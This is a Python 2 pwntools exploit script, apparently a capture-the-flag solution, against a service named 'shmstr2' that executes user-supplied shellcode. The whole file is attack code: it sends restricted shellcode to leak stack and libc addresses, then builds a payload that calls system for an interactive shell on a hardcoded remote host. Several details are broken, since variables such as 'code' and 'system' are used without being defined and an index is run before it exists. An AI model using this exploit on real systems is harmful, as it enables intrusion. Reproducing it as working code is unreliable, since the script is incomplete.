#!python2
from pwn import *
context.arch = "i386"
#io=remote("151.236.114.211",17173)
#context.noptrace = True

def add(shell):
    io.sendlineafter("> ","1")
    io.sendafter("{?} Enter shellcode: ",shell)

def view(idx):
    io.sendlineafter("> ","2")
    io.sendlineafter("{?} Enter idx: ",str(idx))

def delete(idx):
    io.sendlineafter("> ","3")
    io.sendlineafter("{?} Enter idx: ",str(idx))

def run(idx):
    io.sendlineafter("> ","4")
    io.sendlineafter("{?} Enter idx: ",str(idx))

if __name__ == "__main__":
    while(True):
        if(len(sys.argv) > 1):
            io=remote("151.236.114.211",17183)
            context.noptrace = True
        else:
            io = process("./shmstr2",env = {"LD_PRELOAD" : "./libc.so.6"})
        s = asm("""
        pop edx
        push edx
        push esp
        pop eax
        inc ebp
        dec ebp
        inc ebp
        dec ebp
        inc ebp
        dec ebp
        inc ebp
        dec ebp
        inc ebp
        dec ebp
        inc ebp
        dec ebp
        """)
        add(s)
        run(0)
        io.recvuntil("Shellcode return code = ")
        leak = int(io.recvline().strip(),16)
        log.success("leak = " + hex(leak))
        s = asm("""
                push esi
                pop eax
                inc ebp
                dec ebp
                inc ebp
                dec ebp
                inc ebp
                dec ebp
                inc ebp
                dec ebp
                inc ebp
                dec ebp
                inc ebp
                dec ebp
                inc ebp
                dec ebp
                """)
        add(s)
        run(1)
        io.recvuntil("Shellcode return code = ")
        libc = int(io.recvline().strip(),16) - 0x1b0000
        log.success("libc = " + hex(libc))
        read_plt = code + 0x1150
        s = asm("""
            pop ecx
            pop edx
            dec edx
            dec edx
            push ebx
            push ebx
            push ebp
            push edx
            push ecx
            popa
            push eax
            push ecx
            push edx
            push ebx
            push ebp
            push edi
            """)
        add(s)
        run(3)
        bss = code + 0x44e0
        pay = asm("""
            push {}
            pop eax
            xor al, 0x70
            push ebp
            push ebp
            push esi
            push edi
            push eax
            inc ebp
            dec ebp
            inc ecx
            """.format(read_plt))
        add(pay)
        gdb.attach(io)
        gdb.attach(io)
        run(4)
        io.sendline('a'*4 + p32(system) + p32(0xdeafbeef) + p32(libc + 0x15910b))
        io.interactive()
